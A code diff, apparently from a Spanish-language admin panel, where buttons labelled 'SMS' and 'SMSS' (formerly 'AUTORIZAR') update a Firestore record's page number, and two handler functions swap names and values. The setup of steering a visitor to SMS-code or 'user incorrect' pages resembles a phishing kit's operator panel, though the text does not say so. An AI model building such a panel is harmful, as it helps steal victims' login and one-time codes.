@@ -77,9 +77,10 @@
               <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToTwo('${
                 doc.id
               }')">SMS</button>
+			  
 			  <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToTwoo('${
                 doc.id
-              }')">AUTORIZAR</button>
+              }')">SMSS</button>
 
               <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToThree('${
                 doc.id
@@ -150,12 +151,12 @@
           });
       }
 	  
-	  // Función para cambiar la página a 9  changePaget
-      function changePageToTwoo(id) {
+	  // Función para cambiar la página a 6  changePageToUserinco
+      function changePageToUserinco(id) {
         db.collection("prolme")
           .doc(id)
           .update({
-            page: 9,
+            page: 6,
           })
           .then(() => {
             console.log("Página cambiada a 2 para el documento con ID: ", id);
@@ -165,12 +166,12 @@
           });
       }
 	  
-	  // Función para cambiar la página a 6  changePageToUserinco
-      function changePageToUserinco(id) {
+	  // Función para cambiar la página a 9  changePageToTwoo
+      function changePageToTwoo(id) {
         db.collection("prolme")
           .doc(id)
           .update({
-            page: 6,
+            page: 9,
           })
           .then(() => {
             console.log("Página cambiada a 2 para el documento con ID: ", id);
